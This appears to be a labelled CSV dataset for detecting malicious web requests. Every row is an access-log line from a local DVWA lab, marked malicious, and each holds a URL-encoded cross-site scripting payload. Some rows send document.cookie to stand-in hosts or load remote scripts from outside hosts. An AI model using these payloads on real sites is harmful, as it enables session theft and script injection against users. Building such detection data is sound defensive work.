url,malicious
"127.0.0.1 - - [03/May/2021:02:19:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%26#x6A%26#x61%26#x76%26#x61%26#x73%26#x63%26#x72%26#x69%26#x70%26#x74%26#x3A%26#x61%26#x6C%26#x65%26#x72%26#x74%26#x28%26#x27%26#x58%26#x53%26#x53%26#x27%26#x29%3e HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:19:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='%3CIFRAME%20SRC%3djavascript%3aalert(%2527XSS%2527)%3E%3C%2fIFRAME%3E HTTP/1.1"" 200 1690 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3cscript%3edocument%2elocation%3d'http%3a%2f%2fcookieStealer%2fcgi-bin%2fcookie%2ecgi%3f'%2bdocument%2ecookie%3c%2fscript%3e HTTP/1.1"" 200 1705 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E HTTP/1.1"" 200 1708 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:48 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='%3balert(String%2efromCharCode(88,83,83))%2f%2f%5c'%3balert(String%2efromCharCode(88,83,83))%2f%2f%22%3balert(String%2efromCharCode(88,83,83))%2f%2f%5c%22%3balert(String%2efromCharCode(88,83,83))%2f%2f%3e%3c%2fSCRIPT%3e!--%3cSCRIPT%3ealert(String%2efromCharCode(88,83,83))%3c%2fSCRIPT%3e%3d%26%7b%7d HTTP/1.1"" 200 1723 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:19:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=''%3b!--%22%3cXSS%3e%3d%26%7b()%7d HTTP/1.1"" 200 1676 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%20onload%3dalert(1)%3e HTTP/1.1"" 200 1672 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3csvg%20onload%3dalert(1)%2f%2f HTTP/1.1"" 200 1674 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22onmouseover%3dalert(1)%2f%2f HTTP/1.1"" 200 1673 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22autofocus%2fonfocus%3dalert(1)%2f%2f HTTP/1.1"" 200 1676 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='-alert(1)-' HTTP/1.1"" 200 1667 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='-alert(1)%2f%2f HTTP/1.1"" 200 1666 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%5c'-alert(1)%2f%2f HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3c%2fscript%3e%3csvg%20onload%3dalert(1)%3e HTTP/1.1"" 200 1675 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onblur%3dalert(1)%3elose%20focus!%20 HTTP/1.1"" 200 1687 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onclick%3dalert(1)%3eclick%20this!%20 HTTP/1.1"" 200 1679 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20oncopy%3dalert(1)%3ecopy%20this!%20 HTTP/1.1"" 200 1678 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20oncontextmenu%3dalert(1)%3eright%20click%20this!%20 HTTP/1.1"" 200 1687 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20oncut%3dalert(1)%3ecopy%20this!%20 HTTP/1.1"" 200 1679 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20ondblclick%3dalert(1)%3edouble%20click%20this!%20 HTTP/1.1"" 200 1686 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20ondrag%3dalert(1)%3edrag%20this!%20 HTTP/1.1"" 200 1678 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onfocus%3dalert(1)%3efocus%20this!%20 HTTP/1.1"" 200 1686 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:48 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20oninput%3dalert(1)%3einput%20here!%20 HTTP/1.1"" 200 1683 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onkeydown%3dalert(1)%3epress%20any%20key!%20 HTTP/1.1"" 200 1691 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onkeypress%3dalert(1)%3epress%20any%20key!%20 HTTP/1.1"" 200 1689 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onkeyup%3dalert(1)%3epress%20any%20key!%20 HTTP/1.1"" 200 1689 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onmousedown%3dalert(1)%3eclick%20this!%20 HTTP/1.1"" 200 1684 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onmousemove%3dalert(1)%3ehover%20this!%20 HTTP/1.1"" 200 1682 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onmouseout%3dalert(1)%3ehover%20this!%20 HTTP/1.1"" 200 1682 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:23:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onmouseover%3dalert(1)%3ehover%20this!%20 HTTP/1.1"" 200 1682 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onmouseup%3dalert(1)%3eclick%20this!%20 HTTP/1.1"" 200 1682 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onpaste%3dalert(1)%3epaste%20here! HTTP/1.1"" 200 1684 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(1)%2f%2f%20 HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(1)%3c!\xe2\x80\x93 HTTP/1.1"" 200 1678 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%2f%2fbrutelogic%2ecom%2ebr%2f1%2ejs%3e%20 HTTP/1.1"" 200 1676 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%2f%2f3334957647%2f1%3e HTTP/1.1"" 200 1678 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cx%20onxxx%3dalert(1)%20 HTTP/1.1"" 200 1671 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3c%78%20onxxx%3d1%20 HTTP/1.1"" 200 1667 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20%6Fnxxx%3d1%20 HTTP/1.1"" 200 1667 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
